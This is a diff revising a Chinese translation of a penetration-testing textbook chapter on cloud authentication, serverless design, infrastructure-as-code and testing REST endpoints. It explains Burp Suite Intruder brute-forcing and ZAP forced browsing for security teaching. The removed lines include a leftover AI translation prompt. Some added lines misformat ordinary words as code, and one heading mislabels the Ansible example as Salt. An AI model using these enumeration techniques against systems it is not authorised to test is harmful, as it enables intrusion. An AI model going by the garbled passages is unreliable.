 -   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
 
@@ -12368,8 +13408,6 @@ Cloud Computing and the Internet of Things
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
-
-
 
 -   这些提供商中的任何一个的问题在于你会向提供商提供大量数据，即使是用户凭证。这些数据会泄露到提供商，如果提供商被入侵，数据就会被暴露。部分提供商会使用像 Google 和 Facebook 这样的常见、共享的身份验证提供商。这意味着你需要针对身份验证提供商进行攻击，以获取 SaaS 解决方案中某人的用户账户。然而，在某些情况下，提供商可能会使用这些第三方身份验证机制，同时仍然允许用户直接与提供商创建账户。鉴于身份验证过程的复杂性，如果提供商未能实施强有力的身份验证机制，用户账户可能会被泄露。
 
@@ -12399,10 +13437,7 @@ if (condVar > someVal) {console.log("xxx")}
 
 对于 SaaS 服务，客户仅负责数据。他们不必担心任何系统或服务的维护。没有应用需要保持更新，也没有系统管理任务需要执行。唯一可能需要关注的行政任务是用户管理。在软件即服务（SaaS）的情况下，通常需要向用户提供访问权限以符合业务协议。如果你是个人用户使用诸如 Smartsheet、Lucidchart 或无数其他 SaaS 解决方案之一，你只需关注自己的账户。无论哪种情况，你都需要创建用户账户，并在企业级协议中分配特定权限。通常，你不需要自行创建或维护身份和访问管理解决方案。
 
-
-
-
-在某些情况下，企业可能会使用其现有的身份基础设施或目录服务，为云服务提供身份验证。这可能是由于实施了联邦服务，这些服务提供了一个单一的身份验证信息存储库，供多个应用程序使用。这些服务特殊，因为它们允许位于单一信任边界之外的应用程序使用这些身份或验证信息。图 15.8（<a href="https://example.org/#c15.xhtml#c15-fig-0008">参考链接</a>）展示了这种情况的示意图。云内部是企业网络，其中有一个 Active Directory 实例。所有的用户信息，包括用户名、密码以及角色/组，都存储在那里。企业外部有一些额外的服务，它们与中心身份验证信息存储库建立了连接。用户可以拥有一个单一的用户账户，既可以用于企业内部的服务，也可以用于企业外部的服务，从而对用户来说显得无缝。
+在某些情况下，企业可能会使用其现有的身份基础设施或目录服务，为云服务提供身份验证。这可能是由于实施了联邦服务，这些服务提供了一个单一的身份验证信息存储库，供多个应用程序使用。这些服务特殊，因为它们允许位于单一信任边界之外的应用程序使用这些身份或验证信息。图 15.8（[参考链接](https://example.org/#c15.xhtml#c15-fig-0008)）展示了这种情况的示意图。云内部是企业网络，其中有一个 Active Directory 实例。所有的用户信息，包括用户名、密码以及角色/组，都存储在那里。企业外部有一些额外的服务，它们与中心身份验证信息存储库建立了连接。用户可以拥有一个单一的用户账户，既可以用于企业内部的服务，也可以用于企业外部的服务，从而对用户来说显得无缝。
 
 ![FIGURE 15.8 Active Directory federation](img/c15f008.png)
 
@@ -12427,9 +13462,6 @@ if (condVar > someVal) {console.log("xxx")}
 网格计算是一种通过分散处理能力来增加对问题处理能力的方式，但它要求问题必须以不同的方式来处理。例如，当你在准备晚餐时，通常会按顺序完成一系列步骤。如果厨房里有多个人同时处理不同的任务，你可以更快完成。然而，人类往往倾向于采用线性、顺序式的思维方式来解决问题。当拥有多个处理器时，必须思考如何将解决方案拆分，让多个处理单元同时处理问题的不同部分。这会带来协调和通信方面的挑战，因为不同的处理单元可能需要高度关注其他处理单元的状态，以便获取所需的数据。
 
 当然，也可以将大量的同类问题案例分散到多个系统上处理，这同样需要协调和通信，因为每个处理单元都需要向控制器报告进度，并请求更多工作量，直到个别问题得到解决。通常，这需要网络能力和系统之间的通信。从安全与攻击的角度来看，这意味着存在监听和通信的服务。
-
-
-
 
 你可能听说过或见过网格计算项目。20 世纪 90 年代，`distributed.net` 是一个发起 RSA 实验室密码学挑战的项目。此后，该项目处理了 RSA 实验室的多个其他密码学挑战。SETI@home 是一项网格计算计划，旨在通过空间无线电信号搜寻外星生命。这些都是利用一种称为 CPU 盗用（CPU scavenging）的技术的项目，即使用计算机上未被占用的处理器周期。这些系统可供任何人用于其正常的日常计算需求。当有处理器周期未被使用时，执行这些任务的软件将被允许使用处理器。另一个 CPU 盗用项目是 Folding@home，其目标是通过模拟蛋白质帮助科学家识别疾病治疗方法。如前所述，所有这些项目都需要与其他计算机协同工作以协调任务。以下是一个在 Linux 系统上监听请求的 Folding@home 进程示例：
 
@@ -12463,54 +13495,13 @@ Figure 15.9 展示了一个简单的网格计算设置，适用于我们讨论�
 
 
 
-假设你是一个高级文档工程师和翻译员，请参考下面的注意事项了解 Markdown 文档的格式，然后参考示例，将给定英文文本翻译成中文。
-
-## 注意事项
-
--   粗体（**bold**）和斜体（*itatic*）需要翻译翻译内容并保留符号。
--   内联代码（`code`）和代码块不需要翻译。
--   链接（[link](https://example.org)）需要翻译其内容，但保留网址。
--   列表，表格，引用块保留格式，翻译内容
--   原文可能有多行，不要漏掉任何一行，并且注意一定不要重复输出原文！！！
--   输出应包含在“[content]...[/content]”中
-
-## 示例
-
-原文：
-
-[content]
--   [Feynman's learning method](https://wiki.example.org/feynmans_learning_method) is inspired by **Richard Feynman**, the Nobel Prize winner in physics. 
-
-1.  With Feynman's skills, you can understand the knowledge points in depth in just `20 min`, and it is memorable and *hard to forget*. 
-
-```
-if (condVar > someVal) {console.log("xxx")}
-```
-[/content]
-
-译文：
-
-[content]
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
-
-```
-if (condVar > someVal) {console.log("xxx")}
-```
-[/content]
-
-## 以下是需要翻译的文本
-
-[content]
-
 The Web is a stateless being, meaning every request has to start from scratch because HTTP, the protocol used to transmit data back and forth between a web server and a client like a browser or mobile application, is stateless. HTTP has no ability to keep track of a user's state. It only knows what has been sent to the server with that request. As that's the case, the piece that knows where everything is resides on the client side. This means we can take advantage of the client knowing the user state to allow the server to really not know anything except what gets handed to it. This helps open the door to serverless processing. We can truly write functions that are called as they are needed without having to know where the function is running.
 
 All of this is a long way of getting around to serverless functions. Cloud‑native designs will often use serverless functions. You don't provision a complete virtual machine or even a container that houses a virtualized application. You write a function and let your cloud provider take care of how your function will be executed and when it will get called. In AWS, you use Lambda, which is serverless computing. In Microsoft Azure, you create a function app, as you can see in Figure 15.10. This configuration page allows you to specify your runtime stack, which is the language that will be used to process the function you write. Using this method of creating applications, we have gone from physical systems to virtual systems to virtual applications to virtual functions.
 
 There are two important ideas to note here. The first is there is no landing space for an attacker to get to in the absence of vulnerabilities in the implementation of serverless functions. Of course, in reality there is a server under the function, or else there would be nowhere for the function to run. Depending on the implementation, there may be a surface area for the attacker to get access to through a vulnerability in your code. This relies on an implementation where some additional external program is available in the virtualized system or container where the function is executing. It also relies on something that shouldn't be happening, which is that the virtual implementation, whether container or server, remains running after the function has ceased. Because they are small and simple by nature, these serverless functions should be easy and quick to instantiate and then tear down on an as‑needed basis, making them ephemeral.
 
-``` 
+```
 ![FIGURE 15.10 Creating a function app in Azure](img/c15f010.png)
 ```
 
@@ -12538,21 +13529,22 @@ The microservice architecture moves away from a monolithic application, which me
 
 
 
--   [使用无服务器设计的另一种方法](https://example.org) 这可能意味着仅使用函数而非虚拟化应用。没有应用。没有容器。没有操作系统。只有一个函数。这并不消除整体应用被入侵的潜在风险。请记住，攻击者的目标不总是，甚至通常也不是 shell 访问，尽管这是常见的误解。他们传统上（即很久以前）的工作方式是这样。今天，攻击者可能只是在寻找可以出售的数据。这意味着对数据的访问，无论是通过利用应用漏洞获得的非授权访问，还是通过 stolen credentials 获得的授权访问。函数无法防止这种类型的攻击。函数可以让获得系统级别的入侵变得更加困难，但无法阻止应用或数据访问。
 
-服务器无函数是事件驱动的，这意味着没有单一的应用决定哪个函数会被调用。相反，调用函数可能更容易触发，因为它取决于事件。其中一个事件可能是整体应用使用发布/订阅模型。整个应用有一个事件总线。函数通过发布消息到总线来发送。其他函数可以通过订阅来接收消息。如果一个服务器无函数订阅的消息被放到总线上，该函数就会被调用。另一种触发服务器无函数的方式是使用 HTTP 方法，如 GET、POST、PUT 或 DELETE。当整体 Web 应用收到这些 HTTP 请求时，服务器无函数可能会被调用。此外，某些特定的 HTTP 头部的存在也可能导致函数被调用。
+- [使用无服务器设计的另一种方法](https://example.org) 这可能意味着仅使用函数而非虚拟化应用。没有应用。没有容器。没有操作系统。只有一个函数。这并不消除整体应用被入侵的潜在风险。请记住，攻击者的目标不总是，甚至通常也不是 shell 访问，尽管这是常见的误解。他们传统上（即很久以前）的工作方式是这样。今天，攻击者可能只是在寻找可以出售的数据。这意味着对数据的访问，无论是通过利用应用漏洞获得的非授权访问，还是通过 `stolen credentials` 获得的授权访问。函数无法防止这种类型的攻击。函数可以让获得系统级别的入侵变得更加困难，但无法阻止应用或数据访问。
+
+服务器无函数是事件驱动的，这意味着没有单一的应用决定哪个函数会被调用。相反，调用函数可能更容易触发，因为它取决于事件。其中一个事件可能是整体应用使用发布/订阅模型。整个应用有一个事件总线。函数通过发布消息到总线来发送。其他函数可以通过订阅来接收消息。如果一个服务器无函数订阅的消息被放到总线上，该函数就会被调用。另一种触发服务器无函数的方式是使用 HTTP 方法，如 `GET`、`POST`、`PUT` 或 `DELETE`。当整体 Web 应用收到这些 HTTP 请求时，服务器无函数可能会被调用。此外，某些特定的 HTTP 头部的存在也可能导致函数被调用。
 
 由于可能有大量服务在运行，每个都能在消息总线上发布方法，因此获取这些函数的调用方式可能有很多种。这实际上扩大了攻击面，因为可能没有单一的入口点来针对潜在的脆弱代码。这些多个入口点也可能导致认证问题。与其依赖整体应用进行认证，每个函数都必须假设请求可能直接到达该函数，而无需经过任何认证。
 
 尽管服务器无函数可能不让攻击者轻易获得底层操作系统的访问，但 OWASP Top 10 漏洞列表中的风险仍然适用。这尤其适用于配置错误或弱第三方组件导致的漏洞。即使使用云原生设计、微服务和无服务器基础设施，敏感数据仍可能被暴露。
 
-### 部署
+## 部署
 
-目前的部署通常是自动化的。无论目标是 VMware ESXi 服务器上的虚拟机，还是 Microsoft Hyper‑V 服务器，亦或是云提供商的容器，系统资产的部署都可以自动化。虽然自动化的实现方式各有不同，但常见的做法是使用编排平台。使用编排系统通常被称为 *infrastructure as code*（IaC），因为部署是通过脚本语言或客户端‑服务器软件以及定义部署的配置文件来完成。
+目前的部署通常是自动化的。无论目标是 VMware ESXi 服务器上的虚拟机，还是 Microsoft Hyper‑V 服务器，亦或是云提供商的容器，系统资产的部署都可以自动化。虽然自动化的实现方式各有不同，但常见的做法是使用编排平台。使用编排系统通常被称为 `infrastructure as code`（IaC），因为部署是通过脚本语言或客户端‑服务器软件以及定义部署的配置文件来完成。
 
-Ansible 是常用的 IaC 软件包之一。它使用一个存放配置文件的服务器以及一个可在运行系统中执行额外配置的软件代理。下面的示例展示了 Ansible 在 VMware ESXi 服务器上创建现有模板的新实例。Ansible 服务器通过在指定地址使用的凭据与 VMware 服务器通信，并发送命令让模板克隆，从而创建一个新的 Web 服务器实例。这里展示的配置文件采用 Yet Another Markup Language（YAML）格式，这与 Salt 等类似软件包也常用。虽然此示例展示了在 VMware 服务器上创建虚拟机，但你可以使用任何云提供商执行类似操作。
+`Ansible` 是常用的 IaC 软件包之一。它使用一个存放配置文件的服务器以及一个可在运行系统中执行额外配置的软件代理。下面的示例展示了 `Ansible` 在 VMware ESXi 服务器上创建现有模板的新实例。`Ansible` 服务器通过在指定地址使用的凭据与 VMware 服务器通信，并发送命令让模板克隆，从而创建一个新的 Web 服务器实例。这里展示的配置文件采用 `Yet Another Markup Language`（YAML）格式，这与 `Salt` 等类似软件包也常用。虽然此示例展示了在 VMware 服务器上创建虚拟机，但你可以使用任何云提供商执行类似操作。
 
-**Salt 配置**
+### Salt 配置
 
 ```
 - name: Clone existing template
@@ -12574,7 +13566,7 @@ Ansible 是常用的 IaC 软件包之一。它使用一个存放配置文件的�
       wait_for_ip_address: yes
 ```
 
-创建任何虚拟资源实例的另一种方法是使用脚本语言。其中一种是 Terraform，它是用于以代码方式构建环境的语言。从名字就能看出其含义——转换环境。它常在科幻作品中出现，用于把其他星球改造成类似地球或更适合人类居住的环境。不过，你不必局限于 Terraform 这种特定语言。也可以使用通用语言如 PowerShell。下面的示例演示了如何在 Microsoft Azure 中创建虚拟机实例：
+创建任何虚拟资源实例的另一种方法是使用脚本语言。其中一种是 `Terraform`，它是用于以代码方式构建环境的语言。从名字就能看出其含义——转换环境。它常在科幻作品中出现，用于把其他星球改造成类似地球或更适合人类居住的环境。不过，你不必局限于 `Terraform` 这种特定语言。也可以使用通用语言如 `PowerShell`。下面的示例演示了如何在 Microsoft Azure 中创建虚拟机实例：
 
 ```
 $resourceGroup = "OurGroup"
@@ -12594,46 +13586,43 @@ New-AzResourceGroupDeployment `
  (Get-AzVm -ResourceGroupName $resourceGroup).name
 ```
 
-此代码示例需要 Azure PowerShell 模块。你也可以在 Azure Cloud Shell 中运行此代码，它提供了 PowerShell 界面，用于向 Azure 发送程序化命令。这并不意味着你必须使用 Azure 才能执行程序化功能。其他大型云提供商，如 Amazon 和 Google，也提供类似的功能，包括对其 API 的命令行接口。这些是可以在本地机器上安装的软件包，让你能够使用可能被脚本化的命令直接向所选云提供商发送请求。
+此代码示例需要 Azure PowerShell 模块。你也可以在 Azure Cloud Shell 中运行此代码，它提供了 `PowerShell` 界面，用于向 Azure 发送程序化命令。这并不意味着你必须使用 Azure 才能执行程序化功能。其他大型云提供商，如 Amazon 和 Google，也提供类似的功能，包括对其 API 的命令行接口。这些是可以在本地机器上安装的软件包，让你能够使用可能被脚本化的命令直接向所选云提供商发送请求。
 
-在 PowerShell 示例中，你可能注意到有一个模板的引用。这是一个可以在 Azure 中创建并使用 JavaScript Object Notation（JSON）格式存储的配置文件。脚本中引用的就是一个 JSON 文件，它可能是在 Azure 中构建虚拟机时生成的。当你完成所有想要的设置（包括磁盘和内存大小以及想要使用的操作系统）后，可以将配置保存为 JSON 文件，以便以后每次需要创建相同设置的新实例时直接使用。
+在 `PowerShell` 示例中，你可能注意到有一个模板的引用。这是一个可以在 Azure 中创建并使用 `JavaScript Object Notation`（JSON）格式存储的配置文件。脚本中引用的就是一个 `JSON` 文件，它可能是在 Azure 中构建虚拟机时生成的。当你完成所有想要的设置（包括磁盘和内存大小以及想要使用的操作系统）后，可以将配置保存为 `JSON` 文件，以便以后每次需要创建相同设置的新实例时直接使用。
 
-
-其他云提供商也会允许你创建模板，虽然它们可能使用不同的技术来实现。例如，Amazon Web Services（AWS）使用一种名为 CloudFormation Designer 的工具来设计完整的网络，如果你正在寻找这种功能。图 15.12 显示了 CloudFormation Designer。该工具的工作方式类似于你可能已经使用过的绘图工具。你在左侧工具箱中找到想要的元素，然后拖动它到工作区中。你可以为每个正在使用的元素编辑参数。完成后，你可以将已完成的模板保存为 JSON 或 YAML 格式。一旦你有一个模板文件，就可以重复使用它来创建相同设计的任何实例。
+其他云提供商也会允许你创建模板，虽然它们可能使用不同的技术来实现。例如，Amazon Web Services（AWS）使用一种名为 `CloudFormation Designer` 的工具来设计完整的网络，如果你正在寻找这种功能。图 15.12 显示了 `CloudFormation Designer`。该工具的工作方式类似于你可能已经使用过的绘图工具。你在左侧工具箱中找到想要的元素，然后拖动它到工作区中。你可以为每个正在使用的元素编辑参数。完成后，你可以将已完成的模板保存为 `JSON` 或 `YAML` 格式。一旦你有一个模板文件，就可以重复使用它来创建相同设计的任何实例。
 
 使用基础设施即代码（IaC）的优势在于，你可以获得可重复且一致的系统和网络实现。此外，因为这些是配置文件或脚本，它们可以被测试，以确保你得到预期的结果。这在模板或 IaC 配置发生变更时特别有帮助。负责云环境运营的人必须确保任何变更不会影响整体应用的运行。
 
-### 处理 REST
+## 处理 REST
 
-HTTP 的一个问题在于它从未设计用于维持客户端与服务器之间的连接。每次客户端与服务器交互时，都像是第一次一样。仅凭 HTTP，服务器无法知道客户端是谁，因为 HTTP 协议本身没有提供跟踪客户端信息的手段。HTTP 被视为无状态协议。协议本身只关注单个请求和响应， never 会记住任何关于客户端的信息。这使得编写应用变得困难。当然，HTTP 最初只为简单的请求和响应而设计。你需要记住，它最初是为学术界共享论文和信息而开发的，主要用于在学术圈内交流。自那时起，几十年来 HTTP 的需求不断增长。
+HTTP 的一个问题在于它从未设计用于维持客户端与服务器之间的连接。每次客户端与服务器交互时，都像是第一次一样。仅凭 HTTP，服务器无法知道客户端是谁，因为 HTTP 协议本身没有提供跟踪客户端信息的手段。HTTP 被视为无状态协议。协议本身只关注单个请求和响应，`never` 会记住任何关于客户端的信息。这使得编写应用变得困难。当然，HTTP 最初只为简单的请求和响应而设计。你需要记住，它最初是为学术界共享论文和信息而开发的，主要用于在学术圈内交流。自那时起，几十年来 HTTP 的需求不断增长。
 
 ![FIGURE 15.12 AWS CloudFormation Designer](img/c15f012.png)
 
 **FIGURE 15.12** AWS CloudFormation Designer
 
-目前，编写基于 Web 的应用程序（包括可能在移动设备上使用的界面，后端处理通过 Web 服务器完成）的常见做法是使用 API。移动设备应用程序，或通过传统 Web 浏览器呈现的应用，都会调用存储在 Web 服务器上的 API。这种设计可能会使用 Representational State Transfer（REST）。使用 REST 设计风格的应用被称为 RESTful。REST 本身不是协议，也不是特定的实现方式，而是一组架构特性。这些特性包括以下几点：
+目前，编写基于 Web 的应用程序（包括可能在移动设备上使用的界面，后端处理通过 Web 服务器完成）的常见做法是使用 API。移动设备应用程序，或通过传统 Web 浏览器呈现的应用，都会调用存储在 Web 服务器上的 API。这种设计可能会使用 `Representational State Transfer`（REST）。使用 REST 设计风格的应用被称为 `RESTful`。REST 本身不是协议，也不是特定的实现方式，而是一组架构特性。这些特性包括以下几点：
 
-*   **Client‑server Architecture**：应用采用多层架构，包含客户端和服务器，尽管在实际操作中可能还需要其他组件来支持应用的功能。
+* `Client‑server Architecture`：应用采用多层架构，包含客户端和服务器，尽管在实际操作中可能还需要其他组件来支持应用的功能。
 
-*   **Stateless**：应用需要两种状态才能运行。第一种是服务器所知的资源状态，第二种是客户端所知的应用状态。服务器只掌握它有控制权的内容，需要客户端告知其他信息。RESTful 应用之所以被视为无状态，是因为服务器并不维护每个客户端的状态，客户端必须向服务器说明应用状态。
+* `Stateless`：应用需要两种状态才能运行。第一种是服务器所知的资源状态，第二种是客户端所知的应用状态。服务器只掌握它有控制权的内容，需要客户端告知其他信息。`RESTful` 应用之所以被视为无状态，是因为服务器并不维护每个客户端的状态，客户端必须向服务器说明应用状态。
 
-*   **Cacheability**：在某些情况下，服务器会向客户端传输静态数据。任何不依赖于程序交换的数据（即可能随每次请求而变化的数据）可以本地保存，按需提供，而无需再次由服务器传输。
+* `Cacheability`：在某些情况下，服务器会向客户端传输静态数据。任何不依赖于程序交换的数据（即可能随每次请求而变化的数据）可以本地保存，按需提供，而无需再次由服务器传输。
 
-*   **Layered System**：RESTful 应用通常涉及多个组件，层次化设计是必要的。它使得客户端和服务器之间的通信不需要关心实现细节。客户端不需要知道应用背后是否有数据库，它属于独立层。同样，如果使用负载均衡器，客户端和服务器也不必关注它们。这种层次结构提供了良好的模块化，使得组件可以替换而不影响整体功能。
+* `Layered System`：`RESTful` 应用通常涉及多个组件，层次化设计是必要的。它使得客户端和服务器之间的通信不需要关心实现细节。客户端不需要知道应用背后是否有数据库，它属于独立层。同样，如果使用负载均衡器，客户端和服务器也不必关注它们。这种层次结构提供了良好的模块化，使得组件可以替换而不影响整体功能。
 
-*   **Uniform Interface**：无论服务器端如何变化，客户端都使用相同的接口。每个请求必须标识资源。客户端需要知道它需要什么，并相应地调用正确的资源。传输的数据应为自描述的，因为数据可能只有半结构化。缺少的数据元素需要明确标识，以便客户端或服务器能够正确解析。
+* `Uniform Interface`：无论服务器端如何变化，客户端都使用相同的接口。每个请求必须标识资源。客户端需要知道它需要什么，并相应地调用正确的资源。传输的数据应为自描述的，因为数据可能只有半结构化。缺少的数据元素需要明确标识，以便客户端或服务器能够正确解析。
 
-RESTful 应用通常使用常见的 HTTP 动词——GET、POST、PUT、DELETE——来操作应用的状态及其底层数据。大体上，客户端与服务器之间的通信和普通 HTTP 通信相同，只是 PUT 和 DELETE 更可能被应用使用，而不是用于获取静态信息。GET 和 POST 则是常规 Web 请求的主流。测试 RESTful 应用的难点在于需要知道应用使用的端点。这些端点本质是功能调用，但它们看起来像 Web 请求。端点是相对于 Web 目录根路径的路径。图 15.13 给出了一个 Web 应用的示例，捕获的客户端与服务器交互是使用 Burp Suite Community Edition 完成的。
+`RESTful` 应用通常使用常见的 HTTP 动词——`GET`、`POST`、`PUT`、`DELETE`——来操作应用的状态及其底层数据。大体上，客户端与服务器之间的通信和普通 HTTP 通信相同，只是 `PUT` 和 `DELETE` 更可能被应用使用，而不是用于获取静态信息。`GET` 和 `POST` 则是常规 Web 请求的主流。测试 `RESTful` 应用的难点在于需要知道应用使用的端点。这些端点本质是功能调用，但它们看起来像 Web 请求。端点是相对于 Web 目录根路径的路径。图 15.13 给出了一个 Web 应用的示例，捕获的客户端与服务器交互是使用 `Burp Suite Community Edition` 完成的。
 
-在图 15.13 中，你会注意到服务器上调用的端点是 `/sdk/`。这可以在左侧的 POST 请求中看到。这就是正在调用的函数所在的位置。该函数必须能够处理传入的请求。请求本身是 XML（可扩展标记语言），它是一种自描述的数据格式，HTML 基于此。请求以及服务器处理请求所需的所有信息都从客户端传递到服务器。响应也包含 XML 负载。运行在客户端浏览器中的应用需要能够根据服务器返回的信息更新其显示。
+在图 15.13 中，你会注意到服务器上调用的端点是 `/sdk/`。这可以在左侧的 `POST` 请求中看到。这就是正在调用的函数所在的位置。该函数必须能够处理传入的请求。请求本身是 `XML`（可扩展标记语言），它是一种自描述的数据格式，`HTML` 基于此。请求以及服务器处理请求所需的所有信息都从客户端传递到服务器。响应也包含 `XML` 负载。运行在客户端浏览器中的应用需要能够根据服务器返回的信息更新其显示。
 
 ![FIGURE 15.13 Burp Suite testing RESTful application](img/c15f013.png)
 
 **FIGURE 15.13** Burp Suite testing RESTful application
 
-
-
-一旦你了解了端点，就可以开始对其进行测试。在 Burp Suite 中这是一项轻松的任务。你选择要使用的请求，即在客户端‑服务器通信流中找到一个针对你想要测试的端点的请求。你可以将该请求发送到 Burp Suite 的 Intruder 部分。这将帮助你识别想要变更的参数，以便看看是否可以破坏应用程序。这可能包括修改数据、获取未经授权的访问或导致应用程序出现故障。Figure 15.14 显示了一个已发送到 Burp Suite Intruder 的请求。Burp Suite 自动识别出它认为可以修改的参数。例如，以下内容被 Burp Suite 识别为一个参数：
+一旦你了解了端点，就可以开始对其进行测试。在 `Burp Suite` 中这是一项轻松的任务。你选择要使用的请求，即在客户端‑服务器通信流中找到一个针对你想要测试的端点的请求。你可以将该请求发送到 `Burp Suite` 的 `Intruder` 部分。这将帮助你识别想要变更的参数，以便看看是否可以破坏应用程序。这可能包括修改数据、获取未经授权的访问或导致应用程序出现故障。Figure 15.14 显示了一个已发送到 `Burp Suite Intruder` 的请求。`Burp Suite` 自动识别出它认为可以修改的参数。例如，以下内容被 `Burp Suite` 识别为一个参数：
 
 ```
 <operationID>§esxui-b6df§</operationID>
@@ -12643,7 +13632,7 @@ RESTful 应用通常使用常见的 HTTP 动词——GET、POST、PUT、DELETE�
 
 **FIGURE 15.14** Burp Suite Intruder
 
-位于两条 § 字符之间的数据是 Burp Suite 认为可以调整的内容。使用 Intruder 功能，Burp Suite 会对选定的参数取不同值，对一组输入进行重复请求。你可以使用 Burp Suite 创建不同类型的数据操作。Figure 15.15 展示了 Burp Suite 允许的不同负载类型。也许最简单的是 Simple List，它允许你使用包含数值列表的文件。这可能需要你了解参数，以判断提供给应用程序的合适值是什么。如果你不清楚哪种数据会有用，可以使用 Brute Forcer 选项。该选项允许你指定字符集来生成值。你告诉 Burp Suite 最小负载大小和最大负载大小，它会尝试所有可能的值。请记住，请求数量会呈指数增长。使用小写字母和数字，四字符的负载，Burp Suite 指示潜在负载数量超过 160 万。更长的负载或更多字符会显著增加请求数量。
+位于两条 `§` 字符之间的数据是 `Burp Suite` 认为可以调整的内容。使用 `Intruder` 功能，`Burp Suite` 会对选定的参数取不同值，对一组输入进行重复请求。你可以使用 `Burp Suite` 创建不同类型的数据操作。Figure 15.15 展示了 `Burp Suite` 允许的不同负载类型。也许最简单的是 `Simple List`，它允许你使用包含数值列表的文件。这可能需要你了解参数，以判断提供给应用程序的合适值是什么。如果你不清楚哪种数据会有用，可以使用 `Brute Forcer` 选项。该选项允许你指定字符集来生成值。你告诉 `Burp Suite` 最小负载大小和最大负载大小，它会尝试所有可能的值。请记住，请求数量会呈指数增长。使用小写字母和数字，四字符的负载，`Burp Suite` 指示潜在负载数量超过 160 万。更长的负载或更多字符会显著增加请求数量。
 
 ![FIGURE 15.15 Payload options](img/c15f015.png)
 
@@ -12651,24 +13640,23 @@ RESTful 应用通常使用常见的 HTTP 动词——GET、POST、PUT、DELETE�
 
 然而，你可能会遇到的问题是能够识别端点。这是一个问题。在应用程序内部没有标准方式来识别所有可能的端点。例如，在我们正在使用的 VMware Web 界面中，似乎所有请求都通过单一端点进行。这并不常见。应用程序可能有数十个端点，具体取决于应用的复杂程度。测试端点时，你可以使用以下几种方法。首先，如果你在进行白盒测试，可以从执行测试的公司处获取所有端点的列表。如果你在进行黑盒测试，可以进行端点暴力枚举（forced browsing）。这涉及向 Web 服务器发送使用端点名称的请求。如果服务器返回未找到错误（通常是 400 系列），你就知道没有找到端点。其他响应可能需要解析。200 响应意味着你找到了服务器认识的名称，除非服务器被配置为返回 200 响应但显示错误页面。这不常见，因为这违背协议，但确实会发生。
 
-进行强制浏览的方法有多种。你可以编写自己的工具，使用脚本语言，例如准备好一组词列表时。在 Python 等语言中发送 web 请求并跟踪响应非常容易。词列表可在全网找到，包括 API 端点名称列表 `https://github.com/chrislockard/api_wordlist`。这个词列表也可以用于诸如 Burp Suite 之类的工具。你可以再次使用 Intruder 功能，选择要变更的请求的最后部分。此外，你还可以使用 Zed Attack Proxy (ZAP)。它内置了强制浏览功能。你可以在 ZAP 中选择一个站点，右键以打开上下文菜单，然后选择 Attack；从那里你可以对站点或目录进行强制浏览。你可以在 Figure 15.16 中看到上下文菜单和弹出菜单。
+进行强制浏览的方法有多种。你可以编写自己的工具，使用脚本语言，例如准备好一组词列表时。在 `Python` 等语言中发送 web 请求并跟踪响应非常容易。词列表可在全网找到，包括 API 端点名称列表 `https://github.com/chrislockard/api_wordlist`。这个词列表也可以用于诸如 `Burp Suite` 之类的工具。你可以再次使用 `Intruder` 功能，选择要变更的请求的最后部分。此外，你还可以使用 `Zed Attack Proxy` (`ZAP`)。它内置了强制浏览功能。你可以在 `ZAP` 中选择一个站点，右键以打开上下文菜单，然后选择 `Attack`；从那里你可以对站点或目录进行强制浏览。你可以在 Figure 15.16 中看到上下文菜单和弹出菜单。
 
 ![FIGURE 15.16 Force browse in ZAP](img/c15f016.png)
 
 **FIGURE 15.16** Force browse in ZAP
 
-一旦你识别出可用的端点（即使强制浏览也未必能够发现全部端点），你可以回到以往的方式对其进行测试。毕竟，我们仍然是在测试一个运行在应用服务器上的 Web 应用程序。测试不同的 RESTful 应用程序可能存在细微差别。例如，你可能需要更改 User-Agent 字符串来测试某些应用。如果预期请求来自移动应用，使用传统的 IE、Chrome 或 Firefox User-Agent 可能不奏效。应用可能会检查正确的 User-Agent，以确保请求来自正确的位置。
+一旦你识别出可用的端点（即使强制浏览也未必能够发现全部端点），你可以回到以往的方式对其进行测试。毕竟，我们仍然是在测试一个运行在应用服务器上的 Web 应用程序。测试不同的 `RESTful` 应用程序可能存在细微差别。例如，你可能需要更改 `User-Agent` 字符串来测试某些应用。如果预期请求来自移动应用，使用传统的 `IE`、`Chrome` 或 `Firefox` `User-Agent` 可能不奏效。应用可能会检查正确的 `User-Agent`，以确保请求来自正确的位置。
 
-### 常见云端威胁
+## 常见云端威胁
 
 在实践中，使用云提供商并不一定会改变攻击者可用或会使用的途径。攻击者仍然可以使用钓鱼攻击获取凭据，进而访问云端环境。无论你的资源位于何处，你都需要采取必要的阻断和应对措施来保护它们。这可能需要了解云环境的不同特性来执行正确的操作，但所有基本防护仍然必须到位。以下是如果你的资源在云提供商处时可能需要应对的一些常见威胁。
 
-#### 访问管理
+### 访问管理
 
-即使在云端环境中，你也会有用户。通常，你需要处理与本地网络和系统相同的身份和访问管理问题。云环境的规则与你自己的网络和系统相同。所有访问都应被审查并批准，确保每个用户仅拥有完成其工作所需的最小访问权限。这意味着应使用基于角色的访问控制（RBAC）而非为每个用户单独管理权限。每个用户都应拥有强密码，且不在其他地方使用。此外，无论身处何地，都应启用多因素认证（MFA）。
+即使在云端环境中，你也会有用户。通常，你需要处理与本地网络和系统相同的身份和访问管理问题。云环境的规则与你自己的网络和系统相同。所有访问都应被审查并批准，确保每个用户仅拥有完成其工作所需的最小访问权限。这意味着应使用基于角色的访问控制（`RBAC`）而非为每个用户单独管理权限。每个用户都应拥有强密码，且不在其他地方使用。此外，无论身处何地，都应启用多因素认证（`MFA`）。
 
-对一些人来说，挑战在于不知道在不同云环境中如何定位身份和访问管理功能。这与直接在 Windows 服务器上加载 Active Directory 管理应用并不相同，除非你使用联合身份解决方案将云提供商与本地 Active Directory 实例关联。这样，你就可以在本地网络和云提供商网络中使用相同的用户，凭据会在本地 Active Directory 实例上进行验证，尽管请求是针对云提供商的。
-
+对一些人来说，挑战在于不知道在不同云环境中如何定位身份和访问管理功能。这与直接在 `Windows` 服务器上加载 `Active Directory` 管理应用并不相同，除非你使用联合身份解决方案将云提供商与本地 `Active Directory` 实例关联。这样，你就可以在本地网络和云提供商网络中使用相同的用户，凭据会在本地 `Active Directory` 实例上进行验证，尽管请求是针对云提供商的。
 
 
 
@@ -12698,16 +13686,13 @@ RESTful 应用通常使用常见的 HTTP 动词——GET、POST、PUT、DELETE�
 
 ### Web 应用程序 compromise
 
